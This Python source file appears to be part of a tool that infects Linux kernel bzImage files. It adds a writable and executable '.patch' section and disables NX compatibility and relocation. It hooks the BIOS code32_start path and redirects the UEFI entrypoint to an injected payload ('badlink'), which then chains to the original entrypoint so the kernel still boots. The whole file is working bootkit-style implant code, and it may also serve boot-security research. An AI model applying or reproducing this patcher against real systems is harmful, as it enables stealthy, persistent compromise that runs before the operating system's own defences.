"""
Function to append data to a kernel bzImage, and add apply our hooks.
"""
import struct
import pefile
from consts import PAGE_SIZE, BIOS_TARGET_ADDRESS
from utils import pad_size, pad
from bios import bios_patch


def get_text_start(pe):
    text_start = 0
    for section in pe.sections:
        if section.Name != b'.text\x00\x00\x00':
            continue

        text_start = section.PointerToRawData
        break

    return text_start


def add_section(base_pe):
    """
    Create a .patch section in the PE.

    It will be empty and not point to anything.
    """
    base = pefile.PE(data=base_pe)
    base.FILE_HEADER.NumberOfSections += 1
    last_offset = base.sections[-1].__file_offset__ + 0x28

    pe_data = bytearray(base.write())

    # setting our section to null bytes
    pe_data[last_offset:last_offset + 0x28] = b'\x00' * 0x28

    # just setting the name to .patch
    pe_data[last_offset:last_offset + 8] = b'.patch\x00\x00'

    return pe_data


def add_data(pe_data_orig, bl, apply_bios_patch=True, apply_uefi_patch=True):
    """
    Add a new section to store our patch in the PE, then append our data, and
    install the patches to transfer control to our payload.
    """
    # One thing to improve this code is having less conversions in / out of
    # pefile, which I have to do a lot...
    text_start = get_text_start(pefile.PE(data=pe_data_orig))

    # We can fetch the real entrypoints from badlink with this:
    bios_start = bl.get_key('_bios_entry')
    code32 = bl.get_key('_code32_hook')

    # First, add a section to the PE that we can use later on.
    new_pe = add_section(pe_data_orig)

    # -------------------------------------------------------------------------
    # Appending our data to the PE
    # -------------------------------------------------------------------------

    # What we are adding to the last section to pad it so we don't have .bss
    # corrupting our code when we boot via the BIOS path.

    # we need to look at the size of the whole PE so we don't accidentally make
    # the file not match FileAlignment (which should be 512, so 4k is fine)
    initialized_padding = pad_size(len(new_pe), PAGE_SIZE) - len(new_pe)
    initialized_padding += PAGE_SIZE * 2
    new_pe += b'\x00' * initialized_padding

    # Offser_raw is the offset in the patched kernel image where we'll be adding
    # in our code.
    offset_raw = len(new_pe)

    # Add in space for the the payload, so we can copy it in here later.
    patch_section_size = pad_size(bl.size(), PAGE_SIZE)
    new_pe += b'\x00' * patch_section_size

    # -------------------------------------------------------------------------
    # BIOS Patch
    # -------------------------------------------------------------------------

    # This is our BIOS patch, which is very easy to apply.
    # Now we want to disable relocation so the kernel is always at its prefered
    # address with various BIOS bootloaders.
    new_pe[0x234] = 0
    # And fix the prefered address.
    new_pe[0x258:0x258 + 8] = struct.pack('<Q', BIOS_TARGET_ADDRESS)

    # Finally we hook code32_start to run some code that will modify the jmp to
    # the kernel after it is decompressed.
    # If this not applied the kernel will function normally on this bootpath.
    if apply_bios_patch:
        new_code32 = BIOS_TARGET_ADDRESS + offset_raw + code32 - text_start
        new_pe[0x214:0x214 + 4] = struct.pack('<I', new_code32)

    # -------------------------------------------------------------------------
    # Correcting the the patch / data section values
    # -------------------------------------------------------------------------

    pe = pefile.PE(data=new_pe)

    # We need to adjust the size of the section before our .patch section to
    # account for the extra initialized data we added to it.
    # print(pe.sections)
    patch_section = pe.sections[0]
    assert(patch_section.Name == b'.patch\x00\x00')
    data_section = pe.sections[-1]

    # Adjusting the last section
    data_section.SizeOfRawData += initialized_padding
    assert(data_section.SizeOfRawData <= data_section.Misc_VirtualSize)

    # Now fix the patch section
    # Size of section in memory is the same as the raw size.
    patch_section.Misc_VirtualSize = patch_section_size
    patch_section.SizeOfRawData = patch_section_size

    patch_section.VirtualAddress = \
        data_section.VirtualAddress + data_section.Misc_VirtualSize
    patch_section.PointerToRawData = offset_raw

    # We need RWX.
    patch_section.Characteristics |= (
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] | \
        pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']
    )

    # -------------------------------------------------------------------------
    # Fixing the PE Header
    # -------------------------------------------------------------------------

    size_of_code = 0
    size_of_image = pe.OPTIONAL_HEADER.SizeOfHeaders
    for section in pe.sections:
        if section.Characteristics & \
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']:
            size_of_code += section.Misc_VirtualSize
        size_of_image += pad_size(
            section.Misc_VirtualSize,
            pe.OPTIONAL_HEADER.SectionAlignment
        )

    # Now we need to finally change the PE fro
    # Disabling NX_COMPAT. You will get some warnings on some firmware!
    # gotta make it 16 bit again as well.
    pe.OPTIONAL_HEADER.DllCharacteristics &= \
        ~pefile.DLL_CHARACTERISTICS['IMAGE_DLLCHARACTERISTICS_NX_COMPAT']
    pe.OPTIONAL_HEADER.DllCharacteristics &= 0xff_ff

    # Size of the image. This is important, and can cause boot failures if this
    # is wrong!
    print('sizeofimage:', pe.OPTIONAL_HEADER.SizeOfImage, size_of_image)
    pe.OPTIONAL_HEADER.SizeOfImage = size_of_image

    # Code we added
    print('sizeofcode:', pe.OPTIONAL_HEADER.SizeOfCode, size_of_code)
    pe.OPTIONAL_HEADER.SizeOfCode += size_of_code

    # Our new uefi entrypoint.
    uefi_entrypoint = patch_section.VirtualAddress + bl.get_key('_uefi_entry')
    old_entrypoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    if apply_uefi_patch:
        print('entrypoint:', old_entrypoint, uefi_entrypoint)
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = uefi_entrypoint

    # Some asserts to ensure things are A-OK!
    assert((pe.OPTIONAL_HEADER.SizeOfImage %
           pe.OPTIONAL_HEADER.SectionAlignment) == 0)

    pe_data = bytearray(pe.write())

    # -------------------------------------------------------------------------
    # Final fill in for bad link, placing the payload in the PE
    # -------------------------------------------------------------------------
    called_from = patch_section.VirtualAddress
    called_from += bl.get_key('_original_uefi_offset') + 4
    orig_entrypoint = old_entrypoint - called_from

    # need to calculate an offset to use to call the old entrypoint
    bl.set_key('_original_uefi_offset', struct.pack('<i', orig_entrypoint))

    k = BIOS_TARGET_ADDRESS
    k += offset_raw
    k += bl.get_key('_to_copy')
    k -= text_start
    bl.set_key('_offset_to_copy', struct.pack('<I', k))

    # need to set the offsets we use patch the bios.
    b_start, b_dest = bios_patch(pe_data, offset_raw, text_start, bios_start)
    bl.set_key('_offset_bios_entry', struct.pack('<I', b_dest))
    bl.set_key('_offset_dest', struct.pack('<I', b_start))

    # And write it out
    bl_payload = pad(bl.get(), PAGE_SIZE)
    assert(len(bl_payload) == patch_section_size)
    pe_data[-patch_section_size:] = bl_payload

    return pe_data
